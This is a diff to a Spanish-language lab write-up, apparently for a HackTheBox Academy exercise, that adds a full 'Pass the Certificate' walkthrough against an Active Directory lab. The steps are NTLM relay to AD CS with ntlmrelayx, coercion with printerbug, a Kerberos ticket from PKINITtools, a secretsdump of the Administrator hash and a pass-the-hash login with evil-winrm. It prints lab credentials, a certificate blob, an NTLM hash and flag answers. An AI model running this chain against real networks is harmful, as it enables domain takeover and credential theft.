@@ -1594,13 +1594,158 @@ El “Pass the Certificate” (PtC) es una técnica de ataque contra Active Dire
 
 Authenticate to with user "<font color="#00b050">wwhite</font>" and password "<font color="#c00000">package5shores_topher1</font>"
 
-NO HE PODIDO REALIZAR EL EJERCICIO EL ARCHIVO QUE CONSEGUIA DESCARGAR PARECÍA ESTAR CORRUPTO. HE ESTADO MAS DE 10 HORAS Y NADA, DEJO LA SOLUCIÓN.
+<p align="center"> 
+<img src="images/Tendremos las siguiente IPS.png" width="600" alt="Resultado de Nmap">
+</p>
+
+**ACADEMY-PWATTCK-PTCCA01** --> 10.129.234.172 (En esta ip se encuentra el certificado **certfnsh.asp**)
+
+**ACADEMY-PWATTCK-PTCDC01** --> 10.129.234.174 (Servidor)
+
+Para empezar Tendremos que crear un entorno virtual 
+
+```
+python3 -m venv mi_entorno
+source mi_entorno/bin/activate
+```
+
+IMPORTANTE HAY QUE DESCARGARSE IMPACKET CON LA VERSION 0.9.24 [aquí](https://github.com/fortra/impacket/releases)
+
+<p align="center"> 
+<img src="images/impacket0924.png" width="600" alt="Resultado de Nmap">
+</p>
+
+Para descomprimir el paquete de impacket usaremos el siguiente comando:
+
+```
+tar -xvzf impacket-0.9.24.tar.gz
+cd impacket-0.9.24
+pip3 install -r requirements.txt
+```
+
+<p align="center"> 
+<img src="images/requirements+.png" width="600" alt="Resultado de Nmap">
+</p>
+
+Luego haremos una serie de comandos para seguir configurando el impacket dentro de la carpeta impacket
+
+```
+pip3 install .
+pip3 install --upgrade pip setuptools
+python3 setup.py install
+```
+
+Una vez terminada la configuración, instalamos dentro de la carpeta **impacket** la herramienta **ntlmrelayx.py**
+
+>**Es un "intermediario malicioso" (un ataque Man-in-the-Middle)**. Su función principal es interceptar la autenticación de una máquina o usuario de Windows y **retransmitirla (hacer _relay_)** en tiempo real hacia otro servidor de la red para tomar el control de este sin necesidad de descifrar la contraseña.
+
+```
+wget https://github.com/fortra/impacket/raw/refs/heads/master/examples/ntlmrelayx.py
+chmod +x ntlmrelayx.py
+pip install "pyOpenSSL<24.0.0"
+ntlmrelayx.py -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+```
+
+Ahora tendremos que esperar a que el programa reciba la certificación.
+
+Abrimos una nueva termina, usaremos la herramienta **printerbug.py** 
+
+>Si `ntlmrelayx.py` es el receptor que hace el puente, **`printerbug.py` es el anzuelo (o el detonador)**.
+
+>Su única función es **obligar a un servidor de Windows (normalmente un Controlador de Dominio) a que se conecte automáticamente a tu máquina Kali** y te envíe sus credenciales por la red sin que ningún usuario tenga que hacer clic en nada.
+
+>En el mundo de la ciberseguridad, a esto se le llama una herramienta de **coerción de autenticación** (Coerced Authentication).
+
+```
+python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 10.10.15.111
+```
+
+<p align="center"> 
+<img src="images/printerbug.py.png" width="600" alt="Resultado de Nmap">
+</p>
+
+Volviendo a la terminal anterior, recibiremos el puñetero certificado.
+
+<p align="center"> 
+<img src="images/certificado.png" width="600" alt="Resultado de Nmap">
+</p>
+
+>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
+
+Lo guardaremos en un archivo llamado **DC01$.pfx**, el siguiente comando descodificará con `base64 -d` para convertirlo en un archivo binario utilizable, es decir, un archivo `.pfx`
+
+>Es un contenedor digital seguro que se utiliza para almacenar e intercambiar certificados de seguridad.
+
+>Su gran ventaja es que **guarda todo lo necesario para demostrar una identidad digital en un solo archivo cifrado con contraseña.**
+
+```
+base64 -d DC01$.pfx > C01-decoded.pfx
+```
+
+No olvidarse luego, ingresar de nuevo en un **entorno virtual**, dentro de impacket descargamos la herramienta **PKINITtools**
+
+```
+git clone https://github.com/dirkjanm/PKINITtools.git 
+cd PKINITtools
+chmod +x gettgtpkinit.py 
+python3 gettgtpkinit.py -cert-pfx C01-decoded.pfx -dc-ip  10.129.234.174 'inlanefreight.local/dc01$' dc.ccache
+```
+
+> Al pasarle este certificado descoficado a **`gettgtpkinit.py`**, engañas al sistema para que te devuelva un ticket de Kerberos legítimo (`.ccache`) con los máximos privilegios de la red, el cual puedes inyectar en herramientas como `secretsdump` para extraer de golpe todas las contraseñas de la empresa sin que nadie te lo impida.
+
+<p align="center"> 
+<img src="images/dccache.png" width="600" alt="Resultado de Nmap">
+</p>
+
+Creamos una variable entorno y llevamos acabo el siguiente comando:
+
+```
+export KRB5CCNAME=dc.ccache
+python3 /home/dani/Escritorio/Herramienta/impacket-0.9.24/examples/secretsdump.py -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+```
+
+>**`secretsdump.py`** es la herramienta de ejecución final en este tipo de ataques; sirve para **extraer de forma masiva todas las contraseñas cifradas (hashes)** almacenadas en el sistema informático de una red o equipo Windows.
+
+<p align="center"> 
+<img src="images/secretsdump.png" width="600" alt="Resultado de Nmap">
+</p>
+
+En un principio no funcionará porque hay que registrra la ip del servidor en el archivo **/etc/hosts**
+
+<p align="center"> 
+<img src="images/etchosts.png" width="600" alt="Resultado de Nmap">
+</p>
+
+repetimos de nuevo el comando 
+
+```
+python3 /home/dani/Escritorio/Herramienta/impacket-0.9.24/examples/secretsdump.py -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+```
+
+<p align="center"> 
+<img src="images/hashadministrator.png" width="600" alt="Resultado de Nmap">
+</p>
+
+Hemos conseguido el hash del administrator.
+
+Credenciales --> **Administrator**:**fd02e525dd676fd8ca04e200d265f20c**
+
+Ahora abriremos una sesión con Administrator por evil-winrm
+
+```
+evil-winrm -u Administrator -i 10.129.234.174 -H fd02e525dd676fd8ca04e200d265f20c
+type C:\Users\jpinkman\desktop\flag.txt
+```
 
 answer: **3d7e3dfb56b200ef715cfc300f07f3f8**
 
 2. **What are the contents of flag.txt on Administrator's desktop?**
 
-NO HE PODIDO REALIZAR EL EJERCICIO EL ARCHIVO QUE CONSEGUIA DESCARGAR PARECÍA ESTAR CORRUPTO. HE ESTADO MAS DE 10 HORAS Y NADA, DEJO LA SOLUCIÓN.
+Manteniendo la sesión anterior, realizaremos el siguiente para obtener la flag
+
+```
+type C:\Users\Administrator\Desktop\flag.txt
+```
 
 Answer: **a1fc497a8433f5a1b4c18274019a2cdb**
 
